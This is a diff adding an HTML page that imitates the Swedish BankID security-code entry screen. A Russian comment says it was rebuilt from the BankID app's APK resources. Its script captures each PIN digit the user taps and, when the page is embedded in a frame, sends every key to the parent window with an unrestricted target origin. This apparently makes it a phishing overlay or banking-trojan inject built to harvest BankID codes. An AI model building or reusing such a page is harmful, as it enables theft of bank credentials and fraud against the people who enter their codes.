@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="sv">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>BankID — Ange säkerhetskod</title>
+<style>
+  /* Эталонный экран ввода PIN BankID 7.48.0, собранный из ресурсов APK:
+     colors.xml, dimens.xml, styles.xml, layout/security_code_fragment.xml,
+     layout/numpad_grid.xml, layout/numpad_button.xml. */
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { height: 100%; }
+  body {
+    font-family: Roboto, -apple-system, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+    background: #ffffff;
+    color: #000000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
+  .phone {
+    position: relative;
+    width: 100%;
+    max-width: 420px;
+    aspect-ratio: 9 / 16;
+    background: #ffffff;
+    overflow: hidden;
+    box-shadow: 0 0 40px rgba(0,0,0,0.15);
+  }
+  .info {
+    background: #bee1ee;
+    margin: 16px;
+    border-radius: 8px;
+    padding: 16px;
+  }
+  .info h2 {
+    color: #183e4f;
+    font-size: 16px;
+    font-weight: bold;
+    margin-bottom: 8px;
+  }
+  .info p {
+    font-size: 16px;
+    line-height: 1.35;
+  }
+  .input {
+    margin: 8px 16px 0;
+  }
+  .input label {
+    display: block;
+    font-size: 14px;
+    color: #0b2028;
+    margin-bottom: 4px;
+  }
+  .dots {
+    display: flex;
+    justify-content: center;
+    gap: 16px;
+    padding: 12px 0;
+    border-bottom: 2px solid #183e4f;
+    min-height: 48px;
+    align-items: center;
+  }
+  .dot {
+    width: 14px;
+    height: 14px;
+    border-radius: 50%;
+    background: #183e4f;
+  }
+  .dot.empty {
+    background: transparent;
+    border: 2px solid #d2d1cd;
+  }
+  .numpad {
+    position: absolute;
+    inset: 0;
+    pointer-events: none;
+  }
+  .key {
+    position: absolute;
+    width: 33.3%;
+    height: 9.5%;
+    transform: translate(-50%, -50%);
+    background: #e8e7e3;
+    border: none;
+    color: #000000;
+    font-size: 18px;
+    font-weight: normal;
+    cursor: pointer;
+    pointer-events: auto;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .key:active { background: #d2d1cd; }
+  .key.action {
+    background: #183e4f;
+    color: #ffffff;
+    font-size: 16px;
+  }
+  .key.action:active { background: #265f79; }
+</style>
+</head>
+<body>
+
+<div class="phone" id="screen">
+  <div class="info">
+    <h2>Ange säkerhetskod</h2>
+    <p>Ange din säkerhetskod för BankID för att logga in.</p>
+  </div>
+  <div class="input">
+    <label>Säkerhetskod</label>
+    <div class="dots" id="dots"></div>
+  </div>
+  <div class="numpad" id="numpad">
+    <button class="key" data-digit="1" style="left:16.7%;top:62.9%">1</button>
+    <button class="key" data-digit="2" style="left:50.1%;top:62.9%">2</button>
+    <button class="key" data-digit="3" style="left:83.5%;top:62.9%">3</button>
+    <button class="key" data-digit="4" style="left:16.7%;top:71.9%">4</button>
+    <button class="key" data-digit="5" style="left:50.1%;top:71.9%">5</button>
+    <button class="key" data-digit="6" style="left:83.5%;top:71.9%">6</button>
+    <button class="key" data-digit="7" style="left:16.7%;top:80.9%">7</button>
+    <button class="key" data-digit="8" style="left:50.1%;top:80.9%">8</button>
+    <button class="key" data-digit="9" style="left:83.5%;top:80.9%">9</button>
+    <button class="key action" data-action="radera" style="left:16.7%;top:89.8%">Radera</button>
+    <button class="key" data-digit="0" style="left:50.1%;top:89.8%">0</button>
+    <button class="key action" data-action="identifiera" style="left:83.5%;top:89.8%">Identifiera</button>
+  </div>
+</div>
+
+<script>
+  let pin = '';
+  const dots = document.getElementById('dots');
+  const render = () => {
+    dots.innerHTML = '';
+    const total = Math.max(6, pin.length);
+    for (let i = 0; i < total; i++) {
+      const d = document.createElement('div');
+      d.className = 'dot' + (i < pin.length ? '' : ' empty');
+      dots.appendChild(d);
+    }
+  };
+  document.getElementById('numpad').addEventListener('click', (e) => {
+    const btn = e.target.closest('.key');
+    if (!btn) return;
+    const digit = btn.dataset.digit;
+    const action = btn.dataset.action;
+    if (action === 'radera') pin = pin.slice(0, -1);
+    else if (action !== 'identifiera') pin += digit;
+    render();
+    if (window.parent !== window) {
+      window.parent.postMessage({ t: 'bankid-key', key: digit ?? action, pinLength: pin.length }, '*');
+    }
+  });
+  render();
+</script>
+
+</body>
+</html>
